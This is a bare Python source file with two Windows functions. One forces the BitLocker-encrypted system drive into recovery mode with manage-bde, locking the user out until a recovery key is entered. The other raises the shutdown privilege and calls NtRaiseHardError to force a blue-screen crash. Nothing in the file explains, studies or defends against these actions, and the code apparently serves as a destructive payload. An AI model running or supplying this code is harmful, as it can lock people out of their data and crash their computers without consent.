import os
from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll
from typing import NoReturn


def freeze_disk() -> None:
    os.system('manage-bde -forcerecovery C:')


def crash_pc() -> NoReturn:
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19),
        c_uint(1),
        c_uint(0),
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )
